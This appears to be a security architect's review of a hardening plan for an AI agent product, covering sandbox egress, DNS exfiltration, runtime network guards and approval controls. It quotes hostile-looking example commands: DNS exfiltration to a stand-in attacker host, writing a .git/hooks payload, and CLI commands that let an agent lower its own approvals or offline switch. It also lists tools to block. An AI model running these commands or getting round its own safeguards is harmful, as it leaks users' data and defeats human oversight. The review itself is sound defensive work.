# Review of the security hardening plan (2026-09-26)

Reviewer: independent security architect pass (Fable), read-only over the repo at `c7d50ae` on
`feature/trent-fleet-v2`. Under review: `02_plan/output/security-hardening-plan-2026-09-26.md`, its
six discovery inputs under `01_discovery/output/security-*-2026-09-26.md`, and the code the plan
proposes to touch. Every claim below cites a file and line I read; nothing was run, so nothing here
is "verified working" — it is "verified in source".

## Verdict: **REVISE**

The threat model is sound and the discovery is mostly accurate: T-01, T-02, T-03, T-04 and T-10 are
real and correctly located, and the offline audit (D6) is right that no chokepoint or switch exists.
The plan fails on the two waves that carry Bobby's two goals:

1. **SEC-1 / S1.1 asserts a property `--internal` does not deliver** ("the only reachable route is
   the proxy endpoint") and, on the operator's own platform (macOS Docker Desktop), may cut the
   container off from the proxy entirely. It also leaves DNS — the exfil channel behind
   CVE-2025-55284 in D3 §2.3 — unaddressed, while the terminal adapter *routes `dig`, `nslookup`,
   `host`, `ping` and `nc` into the egress container by regex* (`tools/terminal/adapter.ts:40-41`).
2. **SEC-2 / S2a's process-wide guard is built for a runtime Trent does not ship.** The shippable
   artefact is a Bun-compiled binary (`scripts/build/bundle-js.sh:7-9`: "The bundle targets BUN, not
   Node"; `scripts/build-cli.sh:18`: `bun build --compile`; `AGENTS.md` §Known defects 9: durability
   holds under Bun only). Bun's `fetch` is native and consults no undici dispatcher, and its
   `node:http` client does not pass through `net.Socket.prototype.connect`. Under the binary Bobby
   would hand a user, S2a's "any module's fetch throws before a packet leaves" catches nothing, and
   the proof check (S2b) would print `blocked` for paths that are open. That is the exact "theater"
   the plan forbids in its own §0.

Both are fixable in the plan without changing its shape. The required changes are in §5.

---

## 1. Correctness of the findings the plan acts on (spot-checks)

| Finding | Verdict | Evidence |
|---|---|---|
| **T-01** egress container on default bridge, allowlist proxy-honour-only | **Correct, and understated** | `tools/sandbox.ts:23` `DEFAULT_BRIDGE = "bridge"`, `:79` used for the egress container, `:103` `host.docker.internal:host-gateway`. `terminal/DockerBackend.ts:118` passes `--network` verbatim; no `--internal`, no firewall. Understated because `tools/terminal/adapter.ts:40-41` `NEEDS_EGRESS` sends `ping\|dig\|nslookup\|host\|nc` into that container: today a `dig <secret>.attacker.tld` from a network step leaves the host directly. `config/defaults.ts:32` and `config/sections/terminal.ts:17` define `terminal.docker.network` but `tools/index.ts:292` never passes it (`docker: { image }` only), so `ctx.docker?.bridgeNetwork` at `sandbox.ts:79` is always undefined — a dead config key the wave should either use or delete. |
| **T-02** `.git/hooks` writable | **Correct, but scoped too narrowly** | `tools/file_ops/paths.ts:45` denies only `.git/config`. The plan fixes `resolveWorkspacePath` (file_ops) only. The terminal tool runs `sh -c` in the same bind-mounted workspace (`sandbox.ts:93`) and asks approval only on a `dangerous()` finding (`adapter.ts:94-97`), so `printf '...' > .git/hooks/pre-commit; chmod +x .git/hooks/pre-commit` runs with **no approval and no floor** at the default `ask_dangerous`. Same for `git config core.hooksPath`, `core.fsmonitor`, `diff.external`, `filter.*.smudge`. The plan's testable property (`resolveWorkspacePath(...,"write")` throws) would go green while the hole stays open. |
| **T-03** vision/media/a2a untainted | **Correct** | `governance/provenance.ts:42` `UNTRUSTED_ADAPTERS = ["web","browser","mcp","plugins","inbound"]`. Adapter names are `"vision"` (`tools/vision/index.ts:21`), `MEDIA_ADAPTER_NAME` (`tools/media/index.ts:262`), `"a2a"` (`tools/a2a/schemas.ts:13`), so the string-list fix works. Missing sibling: a `terminal` call that ran in the egress container (`useEgress` true, `adapter.ts:98`) returns internet content as `trusted`; `curl https://attacker/page` then `memory add` is not held. D1 §4 item 12 names exactly this. |
| **T-04** social/media raw `fetch` | **Correct** | `tools/social/publish.ts:56` `fetchImpl ?? ((url, init) => fetch(url, init))`; `tools/index.ts:331` passes no `egress`, no gate. Routing through the proxy is viable: `egress/CredentialBroker.ts:64-73` `extractToken` accepts only `trnt_egress_`-prefixed values, so a user's own `authorization: Bearer <bsky jwt>` passes intact (matches `docs/security.md` "a caller's own key passes intact"). But `bsky.social` / Buffer are not in `intercept_domains` (`defaults.ts:42-46`), so S1.4 as written turns social into "always refused" unless `trent connect` adds the provider hosts to the allowlist or the build gate names the missing host. The plan does not say which. |
| **T-05/T-06/T-07** hardline gaps | **Correct** | `hardline.ts:150-156` `isTrentReadTarget` covers `~/.ssh` + Trent files only; `:131-138` `isTrentWriteTarget` covers `.env`, `workspace-trust.json`, egress files only; `approval-floors.ts:121-134` `shellPayloads` unwraps `sh -c` and `eval` only. **T-07 is under-rated**: `gateway.json` is the bound-approval store, so a write forges an approval for a held send/payment. On `LocalBackend` (a documented backend, `sandbox.ts:129`) that is High, not Medium, and it also governs the offline key (see §2.3). |
| **T-08** stdio MCP = host exec before scan | **Correct; mitigation holds** | `tools/mcp/client.ts:167-171` spawns `StdioClientTransport` on the host. No seat tool writes `mcp_servers` (`tools/mcp/index.ts:128` reads config only), so it stays operator-gated. |
| **T-09** email forgeable without `authserv_id` | **Overstated** | `gateway/platforms/email/auth-results.ts:9-12` already documents the design: without a pinned id the *topmost* header is read because a receiving MTA prepends its own; a sender-injected header lands *below* it. Forgery works only when the receiving MTA writes **no** `Authentication-Results` (and then also via a sender-supplied `Received-SPF`, `:173-176`). So: real on a bare IMAP server, not on Gmail/Fastmail/Outlook. Severity Low-Medium, and the fix should be at setup (detect and pin the id) rather than a per-mail refusal that breaks every working deployment. |
| **T-10** no `--memory` | **Correct** | `sandbox.ts:96` sets `pidsLimit` only; `DockerBackend.ts:122` honours `memory` when given. `readOnlyRootfs` (`:121`) is likewise never set — a free hardening the plan does not take. |
| **O-01/O-02** no switch, no chokepoint | **Correct** | No `setGlobalDispatcher`/`ProxyAgent` anywhere (grep: only comments in `retry.ts`, `local-runtime.ts`). Gateway platforms use `ws`/`WebSocket` (`gateway/platforms/{discord,slack,mattermost}.ts`). **But** the fix direction inherits a Node assumption the shipped runtime violates (§2.2). |
| **O-06** browser = unrestricted egress | **Overstated for the launched browser** | `tools/browser/launch.ts:3-7,59` launches Chromium with `proxy.server = <egress proxy>`, bypass `<-loopback>` (loopback also proxied, so the SSRF floor applies) and pins the egress CA's SPKI. The *attached* browser (`browserAttachOptions`, `tools/index.ts:359`) is the user's own and is outside the proxy. Chromium's UDP paths (WebRTC/STUN, QUIC) are not covered by an HTTP proxy setting. Disabling `browser` in offline mode is still the right call; the reason should be stated correctly. |

---

## 2. Will the proposed fixes hold? Bypasses the plan misses

### 2.1 S1.1 — `--internal` is not "only the proxy is reachable"

What `--internal` does on Linux: libnetwork adds `DROP` rules for traffic entering or leaving the
bridge whose other end is outside the network's subnet; it does not masquerade. Consequences the
plan's property does not survive:

- **The proxy may become unreachable.** `--add-host host.docker.internal:host-gateway` resolves to
  the *default* bridge's gateway (`172.17.0.1`, `egress/bind-hosts.ts:14`), and on Linux the proxy is
  bound to exactly that address (`bind-hosts.ts:52-56`; `apps/cli/src/repl/tools.ts:226,237`). An
  internal network has its own subnet (`172.18.0.0/16` or similar), so `172.17.0.1` is off-subnet
  and dropped. The fix must bind the proxy to the **internal network's** gateway and set
  `--add-host host.docker.internal:<that gateway>`. On Docker Desktop (macOS/Windows — Bobby's
  host is Darwin), `host.docker.internal` is served by the VM's gateway, and internal networks are
  widely reported to lose host access. **This must be measured on both platforms before the wave
  is designed, not after it lands.**
- **The host is still reachable.** The internal bridge's gateway IP is in-subnet, so every host
  service bound to `0.0.0.0` (Ollama on `:11434` with no auth — D3 §7 "Probllama"; the wrapped app on
  `:3000`; Postgres; LM Studio) is reachable from the sandbox. "Only the proxy" needs either a
  container-side rule set (impossible with `--cap-drop=ALL`, `DockerBackend.ts:119`, unless applied
  by an entrypoint before privileges drop) or a **sidecar forwarder**: a tiny container dual-homed on
  the internal network and the default bridge that forwards one port to the host proxy, with the
  sandbox's `host.docker.internal` pointing at the sidecar and the internal network created with
  `-o com.docker.network.bridge.gateway_mode_ipv4=isolated` where the daemon supports it. Either way
  the **property must be rewritten honestly**: "no route except `<proxy host>:<proxy port>`; a host
  service on another port is unreachable" is the property; `--internal` alone gives "no route off the
  host".
- **DNS is a separate channel.** Docker's embedded resolver (`127.0.0.11`) lives in the daemon and
  forwards to the host's resolver; whether it forwards from an internal network depends on the
  daemon version. With `NEEDS_EGRESS` (`adapter.ts:40-41`) sending `dig`/`nslookup`/`host`/`ping`
  into this container, a resolvable name is an exfil channel (D3 §2.3, must-defend #6). Required:
  the egress container gets **no working resolver** (`--dns 127.0.0.1` or equivalent; the proxy
  resolves names on the host at `EgressProxy.ts:347-359`, and `host.docker.internal` comes from
  `/etc/hosts`), and the property includes "a `dig` of a non-allowlisted name from the egress sandbox
  returns no answer". Consider removing `ping|dig|nslookup|host|nc` from `NEEDS_EGRESS` altogether:
  none of them can do anything useful through an HTTP proxy.
- **Lateral movement between seats.** One shared named internal network would let two concurrent
  seats' egress containers (different workspaces, possibly different tenants) talk to each other.
  Create it with `-o com.docker.network.bridge.enable_icc=false`, or one network per sandbox label
  (`sandbox.ts:61`), and clean it up in `cleanup()` (`:122-126`).
- **IPv6.** If the daemon has IPv6 enabled, the internal network needs `--ipv6` semantics checked or
  disabled; the isolation rules are per address family.
- **What the allowlist still permits.** Even perfect L3 isolation leaves every allowlisted host as a
  sink: the sandbox holds `TRENT_PROXY_TOKEN` (`SandboxEnvironment.ts:41`), so it can POST anything
  to `api.openai.com` with the real key swapped in. That is by design (the provider is the user's
  own account), but the receipt (S5.2) must say "hosts reached" honestly rather than "nothing left".

### 2.2 S2a — the process-wide guard does not exist on the shipped runtime

- **Bun.** `scripts/build/bundle-js.sh:7-9` and `scripts/build-cli.sh:18,29` make Bun the runtime
  of both the npm bundle and the compiled binary; `package.json:18` `cli:bun` is the durable-store
  path (`AGENTS.md` defect 9). Under Bun: `fetch` is native (no undici dispatcher symbol is consulted);
  `node:http`/`https` clients are Bun's own implementation; `node:net`/`node:tls` prototype patches
  do not sit under `fetch`. The plan's O-02 property ("a direct `fetch("https://example.com")` from
  any module throws `EgressBlocked`") is therefore **false under the binary** and, worse, S2b's proof
  check would assert it true if it only tests the Node code path. Any test written with vitest under
  Node would go green and prove nothing about the product.
- **Even under Node the guard has holes**: `dns.lookup`/`dns.resolve*` fire *before* `connect` and
  a hostname query is itself egress (encode data in a subdomain); `dgram` is untouched; a
  `worker_threads` Worker has fresh module state (none in tree today — keep it that way with a
  test); a dependency that ships its own `undici` copy shares the `Symbol.for` dispatcher only when
  the symbol version matches; `child_process` is untouched (`git`, `docker`, `curl` on LocalBackend,
  faster-whisper, hooks, MCP stdio servers, the browser).
- **The runtime-agnostic mechanism that does work** is the one the plan already half-describes in
  S2b: a single dial chokepoint in code. Concretely: `egress/dial.ts` exporting the only permitted
  `fetch`, `http(s).request`, `WebSocket` and `net/tls.connect` factories, each consulting the
  offline policy (loopback literal / `localhost` / the configured local base host:port allowed;
  everything else `EgressBlocked` naming module and host, *before* any resolution); every network
  module imports it; and a **static coverage test** that fails on any bare `fetch(`,
  `globalThis.fetch`, `from "node:http"`, `"node:https"`, `"node:net"`, `"node:tls"`, `"node:dns"`,
  `"ws"`, or `new WebSocket` outside `egress/` and an explicit allow-listed set of files (the registry
  *is* that allow-list). That is testable under both runtimes, cannot silently regress, and is what
  the doctor can truthfully report. Keep the Node `net`/`undici` monkeypatch as labelled
  defense-in-depth (`runtime guard: node only`), never as the layer a claim rests on.
- **Do not reuse the SSRF floor for the offline allow-rule.** `tools/web/url-safety.ts:85,94`
  *denies* loopback by design. Offline mode must *allow* loopback and the local model base URL while
  denying everything else; conflating the two breaks every local model call.

### 2.3 Other ways offline mode leaks as planned

- **The switch is a config key an agent may be able to write.** `egress.offline` in `config.yaml`
  with T-07 (`config.yaml` not write-protected, `hardline.ts:131-138`) parked in SEC-3 means an agent
  on LocalBackend can turn offline off for the next run. Move S3.3 ahead of S2, and make the CLI flag
  / environment variable (`TRENT_OFFLINE=1`) **one-way**: config can turn offline on, nothing can
  turn a flag-set offline off.
- **Self-lowering via the CLI** (Hermes H-X-02's Trent analogue, D1 §4 item 2). On LocalBackend a
  terminal command `trent config set autonomy never`, `trent hooks consent`, `trent workspace trust`,
  `trent mcp add`, `trent approvals approve <id>` or `trent security preset ...` is not on any floor
  (`approval-patterns.ts:40` covers only a *path* write to `config.yaml`). The docker image carries no
  `trent` binary (`scripts/sandbox/Dockerfile:6-7,16`), so this is LocalBackend-only — but that is
  exactly where offline cannot be enforced anyway, and the plan is silent on it.
- **Subprocesses are outside every layer.** In offline mode: the egress container must **not be
  created** (both sandboxes `--network none`) — do not depend on S1.1 landing first; LocalBackend
  terminal must be refused or the doctor must print `OPEN: terminal.backend=local` and exit non-zero;
  stdio MCP servers, user hooks (`hooks/runner.ts:49-63` spawn with the caller's env), plugins,
  faster-whisper and the browser are host processes with the host's network; child runs
  (`apps/cli/src/runtime/child-run.ts:135-136`) inherit `process.env`, so the offline intent must
  travel as an env var, not only a CLI flag.
- **The canary must not itself leak.** S2b "actively dials a canary non-loopback address": if the
  guard is broken, the canary is the leak, and a *hostname* canary leaks via DNS even when connect is
  blocked. Use an RFC 5737 IP literal (`192.0.2.1`) with a short timeout and never a hostname.
- **Doctor honesty.** The check must run under the runtime that ships (Bun) and print, per registry
  row, *which* layer covers it (`code chokepoint`, `config gate`, `container network none`,
  `runtime guard (node only)`, `NOT COVERED: host subprocess`) — the caveat the plan promises in S2b
  ("proves the proxied+guarded paths") needs to be per row, not a footnote.

### 2.4 S1.2 — property is green while the hole stays open

Covered in §1. Required: one shared "persistence locations" predicate used by `deniedReason`
(`paths.ts:41`) **and** a hardline rule for command subjects (`hardline.ts:208`, using the existing
`WRITE_VERB`/`pathTokens` machinery at `:121-129`), covering `.git/hooks/**`, `.git/config`, and a
`git config` command that sets `core.hooksPath|core.fsmonitor|core.sshCommand|core.askPass|
credential.helper|diff.external|filter.*.(clean|smudge)|core.pager|core.editor|alias.*`. Test both
surfaces with the same fixture list. Optional, same predicate: `.husky/`, `.envrc`, `.vscode/tasks.json`
(auto-run tasks), and for LocalBackend the D1 §4 item 9 set (`~/.zshenv`, `~/.zlogin`,
`~/.bash_login`, `~/.config/fish/`, `crontab -`, `~/Library/LaunchAgents`, `~/.config/systemd/user`,
`~/.gitconfig`).

### 2.5 S1.3 — add the terminal-egress sibling

Add: a `terminal`/`process_manage` result produced with `useEgress === true` (`adapter.ts:98,107`)
is tagged `provenance: "untrusted"` on the record, which `provenanceOf` (`provenance.ts:82-84`)
already honours. Property mirrors the `web_extract` test: `terminal {"command":"curl https://x"}`
then `memory add` returns `needs_approval`.

### 2.6 S1.4 — say where the hosts come from

Either `trent connect <provider>` adds the provider's API host(s) to `egress.intercept_domains` (with
the bound-token `hosts` list, `egress/host-binding.ts`) or the social build gate refuses with a
reason naming the missing host. Buffer's "public media URL" requirement means media publishing
through Buffer needs an upload host too; state it or scope it out.

### 2.7 S4.2 — fail closed at setup, not per mail

Replace "an inbound mail carrying a self-authored header is refused" (which cannot be distinguished
from a legitimate MTA header without the id) with: `gateway.email` with `require_authenticated_from`
true and no `authserv_id` **refuses to start** with an actionable message, and `trent gateway setup
email` (or a `--detect-authserv` step) reads the topmost `Authentication-Results` authserv-id across
the last N messages, requires consistency, and pins it. Per-mail refusal becomes unnecessary.

---

## 3. Ordering, scope, missing gaps, invariant risks

**Ordering.** SEC-1 → SEC-2 → SEC-3 → SEC-4 → SEC-5 is right in spirit; two moves are required:
S3.3 (control-plane write protection) plus the new self-lowering hardline rule move into SEC-1 (they
protect the switch SEC-2 adds), and S2a must be re-specified (§2.2) before any S2 test is written.
S1.1 needs a **measurement spike** (a throwaway script on Linux CI and on Bobby's Docker Desktop:
create internal network, run the sandbox image, `curl` the proxy, `curl 1.1.1.1`, `dig example.com`,
`curl host.docker.internal:11434`) *before* its red test is written, or the red test will be written
against a mechanism that may not exist on the target platform.

**Too big to land safely.** S2a as written is three features (config gate, dispatcher guard,
allowlist collapse) in one; after §2.2 it becomes: S2a-i config gate + one-way flag; S2a-ii dial
chokepoint + coverage test (the largest single change: every network module's import line);
S2a-iii Node runtime guard (labelled). S1.1 is its own wave and should not share a commit with
S1.2–S1.4.

**Missing from the plan, present in discovery:**
1. DNS exfil from the egress sandbox (D3 §2.3, must-defend #6) — §2.1.
2. Self-lowering via `trent config set` etc. from a LocalBackend terminal (D1 §4 item 2) — §2.3.
3. Terminal network output untainted (D1 §4 item 12) — §2.5.
4. MCP rug-pull / tool-definition drift (D5 A10, D3 §4.3, must-defend #13): S4.1 pins the *command*
   only. Pin the canonical hash of each tool's `{name, description, inputSchema}` at consent and
   return `needs_reapproval` on drift — the `hooks/consent.ts` mechanism already exists; mirror it.
5. Shared persistence-locations predicate across tools (D1 §4 item 9) — §2.4.
6. `readOnlyRootfs` (`DockerBackend.ts:121`) + `--tmpfs /tmp:rw,noexec,nosuid` for both sandboxes —
   Hermes already does noexec tmpfs (D1 §3 "Docker hardening"); Trent should not regress below.
7. Dead `terminal.docker.network` key (`config/sections/terminal.ts:17`, `defaults.ts:32`) — S1.1
   must either wire it (as the network *mode*: `internal|none`) or remove it; either way regenerate
   `schema-split.snapshot.json`.
8. Hidden-Unicode (bidi / zero-width) handling in instruction-file and MCP-description scans (D3
   §1.2, must-defend #2 and #11). Verify `cron/prompt-scan.ts` and `mcp/scan.ts` strip or flag them;
   if not, it is a one-rule addition.
9. Headless invocation by an unknown parent (D3 §6.1 s1ngularity, must-defend #22): a `trent run`
   launched non-interactively should not have network + secrets without a gate. At minimum document;
   ideally `ask_dangerous` becomes `ask_always`-for-egress when stdin is not a TTY and no gateway
   surface is present (Hermes fails closed here, D1 §3).

**Invariant risks.** Nothing in the plan touches `apps/web/**`; T-11 stays report-only — correct.
"No canned responses" is untouched. The standalone env contract (`TRENT_QUEUE_FALLBACK=disabled`,
`apps/cli/src/env-defaults.ts:13-14` first import) is where the offline env var must also be applied:
put the one-way offline flag in `env-defaults.ts` so it is set before any module that could dial is
evaluated; do not add a second "first import". Existing tests at risk: `terminal/*.test.ts` on
`buildCreateArgs` argv order (S1.1, S3.4), `governance/provenance.test.ts` and the two memory-gate
tests (S1.3 changes taint for `media`/`vision` — voice-note flows through the gateway will now hold a
memory write, which is correct), `config/*` snapshot tests on any new key, and
`gateway/platforms/email.*.test.ts` if S4.2 changes `checkSenderAuth` semantics rather than startup.

---

## 4. Design-gate decisions (§3 of the plan)

1. **Default posture.** Agree: S1–S4 on by default, offline and browser-off opt-in, `paranoid`
   bundles the strict set. Two amendments: (a) `trent setup --mode local` should *offer* offline on
   (D6 §3.1) and the wizard (D5 B9) should end with the posture card showing "offline: enforced
   (chokepoint + container none + config gate)" or "offline: not enforced — terminal.backend=local"
   so the feeling matches the fact; (b) S4.1's MCP consent should be recorded **by `trent mcp add`
   itself** (the operator is already at the keyboard), so the default-on gate costs zero prompts.
2. **S1.1 rollout.** Disagree with "default ON with doctor explaining if it can't". If the internal
   network cannot reach the proxy (likely on Docker Desktop until measured), the honest default is
   **fail closed**: no egress container; network commands return `[no network: egress firewall
   unavailable on this docker]`, `trent doctor` names it, and the override
   (`terminal.docker.egress_firewall: off`) prints a warning that the allowlist is proxy-honour-only.
   Falling back silently to today's bridge would make "default ON" a label. Measure first (§3).
3. **Scope/order.** Agree with SEC-1 + SEC-2 first, with the S3.3/self-lowering pull-forward and the
   S2a re-specification. SEC-5's B1 grade must **downgrade for runtime**: a Bun binary without the
   Node runtime guard is not a lower grade if the chokepoint + coverage test hold; a `local` backend
   is. Encode that in the grade function, not the prose.

Usability check on the strict defaults: `.git/hooks` deny costs nothing legitimate (a seat has no
business installing hooks; a human does it outside Trent); the persistence rule set may false-positive
on `git config user.email` — scope the `git config` rule to the named keys only; email fail-closed at
setup with auto-detect is one command, not a broken inbox; `--dns 127.0.0.1` in the egress container
breaks nothing that goes through an HTTP proxy (`npm`, `pip`, `curl`, `git https`) and breaks `ssh`,
`scp`, `rsync`, `nc`, `ping`, `dig` — which the proxy never carried anyway.

---

## 5. Required changes

1. **Re-specify S1.1 around a measured mechanism and an honest property.** Before the red test:
   a measurement spike on Linux and Docker Desktop (internal network + sandbox image: proxy reachable?
   `1.1.1.1` unreachable? `dig` answers? host `:11434` reachable?). Then the property: "from the
   egress sandbox, the only reachable endpoint is `host.docker.internal:<proxy port>`; a direct dial
   to any other address, a `--noproxy '*'` request, and a DNS query for a non-allowlisted name all
   fail". Bind the proxy to the internal network's gateway (or use a dual-homed sidecar) and point
   `--add-host` at it (`egress/bind-hosts.ts:52-56`, `tools/sandbox.ts:103`, `repl/tools.ts:226-262`);
   `--dns 127.0.0.1` on the egress container; `enable_icc=false` or a per-label network; cleanup in
   `DockerSandbox.cleanup()`. Wire or delete `terminal.docker.network`.
2. **Fail closed when the firewall cannot be built.** No egress container without the internal
   network; `[no network: ...]` note in the tool result; doctor line; explicit override that warns.
3. **Replace S2a's guard with a runtime-agnostic chokepoint + static coverage test.** `egress/dial.ts`
   as the sole permitted dial surface (fetch/http/https/ws/net/tls/dns), imported by every network
   module named in D6 §1; a test that greps the tree for bare dial imports outside the allow-list and
   fails on any new one. The Node `undici`/`net` monkeypatch stays as labelled defense-in-depth.
   Every S2 test and the doctor proof run under **Bun** as well as Node (a `bun test` or
   `bun run vitest` job for `egress/`), because the binary is Bun.
4. **Make the offline switch one-way and set it first.** `TRENT_OFFLINE=1` / `--offline` applied in
   `apps/cli/src/env-defaults.ts` (already the mandated first import), inherited by child runs
   (`child-run.ts:135`), and never lowered by `config.yaml`; config may only raise it.
5. **Offline ⇒ no egress container and no LocalBackend claim.** Both docker sandboxes `--network
   none` when offline regardless of S1.1; `terminal.backend: local` under offline either refuses or
   the doctor prints `OPEN` and exits non-zero. Hooks, stdio MCP, plugins, faster-whisper, browser:
   refused or `OPEN` in the registry, per row.
6. **Fix the canary.** RFC 5737 IP literal, short timeout, no hostname canary anywhere in the proof.
7. **Widen S1.2 to both write surfaces.** One persistence predicate shared by
   `file_ops/paths.ts deniedReason` and a new hardline rule; cover `.git/hooks/**`, `.git/config`, and
   `git config` setting the executable-bearing keys listed in §2.4. Same fixture list for both tests.
8. **Pull S3.3 into SEC-1 and add the self-lowering rule.** `TRENT_CONTROL_FILES` widened to
   `config.yaml`, `hooks-consent.json`, `gateway.json`, `approvals-audit.ndjson`, `idempotency.json`;
   plus a hardline command rule refusing `trent (config set|hooks consent|mcp add|workspace trust|
   approvals approve|security preset|gateway pair)` from any tool. Re-rate T-07 High on LocalBackend.
9. **S1.3 sibling: taint egress-run terminal output.** Tag `terminal`/`process_manage` records
   `untrusted` when `useEgress` is true (`tools/terminal/adapter.ts:98,107`).
10. **S1.4: name the allowlist path.** `trent connect` adds provider hosts to `intercept_domains`
    (or the build gate refuses naming the host); state Buffer's public-media-URL consequence.
11. **S4.1: pin tool definitions, not only the command.** Canonical hash of each MCP tool's
    `{name, description, inputSchema}` recorded at consent; drift ⇒ `needs_reapproval`, tool not
    callable. Consent recorded by `trent mcp add`.
12. **S4.2: fail closed at startup, detect at setup.** Refuse to start email with
    `require_authenticated_from` and no `authserv_id`; add detection/pinning to gateway setup. Drop the
    per-mail "self-authored header refused" property (undecidable without the id). Downgrade T-09.
13. **Doctor/receipt honesty.** Per-registry-row layer attribution (§2.3 last bullet); the receipt's
    "hosts reached" lists allowlisted hosts as reached, never as "nothing left".
14. **Correct O-06's stated reason** (launched browser *is* proxied and CA-pinned, `browser/launch.ts:59`;
    the gap is attach mode and UDP side channels) so the "explain why blocked" text (S5.6) is true.

## 6. Optional improvements

- `readOnlyRootfs: true` + `--tmpfs /tmp:rw,noexec,nosuid,size=…` for both sandboxes (`DockerBackend.ts:121`).
- Remove `ping|dig|nslookup|host|nc|ssh|scp|rsync` from `NEEDS_EGRESS` (`adapter.ts:40-41`); none
  work through an HTTP proxy and each is a probe or exfil primitive.
- Extend the persistence predicate to the LocalBackend set (`~/.zshenv`, crontab, LaunchAgents,
  systemd user units, `~/.gitconfig`) and to `.husky/`, `.envrc`, `.vscode/tasks.json`.
- Bidi/zero-width stripping in `cron/prompt-scan.ts` and `mcp/scan.ts` if absent.
- Non-TTY / unknown-parent posture (must-defend #22): no egress + secrets without a gate.
- `/health` on the proxy (`EgressProxy.ts:270-278`) is unauthenticated and lists `interceptDomains`
  and the active-token count; low, but a sandbox can read it — consider token-gating it.
- Proxy-side resolve-once IP pinning for allowlisted hosts (D5 A8) is low value given the allowlist
  is operator-set; leave for later.
- SEC-5 B1 grade: make "shipped runtime" and "backend" explicit inputs so the letter cannot read A
  on `terminal.backend: local`.

## 7. What this review read (evidence trail)

Plan and six discovery documents in full. Code: `packages/trent-core/src/tools/sandbox.ts`,
`terminal/DockerBackend.ts`, `tools/file_ops/paths.ts`, `governance/provenance.ts`,
`governance/hardline.ts:120-296`, `tools/approval-floors.ts:100-183`, `egress/EgressProxy.ts`,
`egress/SandboxEnvironment.ts`, `egress/bind-hosts.ts`, `egress/CredentialBroker.ts:64-73`,
`tools/index.ts:280-400`, `tools/terminal/adapter.ts:35-125`, `tools/web/proxied-fetch.ts:69,233`,
`tools/web/url-safety.ts:85,94`, `tools/browser/launch.ts`, `tools/browser/index.ts`,
`tools/social/publish.ts:40-70`, `tools/media/image.ts:210-225`, `tools/mcp/client.ts`,
`tools/mcp/index.ts`, `gateway/platforms/email/auth-results.ts`, `gateway/WebhookServer.ts:25-29`,
`a2a/A2AServer.ts:110`, `config/defaults.ts:30-70`, `config/sections/terminal.ts`,
`apps/cli/src/index.ts`, `apps/cli/src/env-defaults.ts`, `apps/cli/src/repl/tools.ts:220-265`,
`apps/cli/src/runtime/child-run.ts`, `scripts/build-cli.sh`, `scripts/build/bundle-js.sh`,
`scripts/sandbox/Dockerfile`, `AGENTS.md`, `docs/security.md`,
`docs/sessions/2026-09-26-security-fortress.md`. Read-only; no command was executed against docker,
so every runtime claim about `--internal` is flagged above as "measure first".
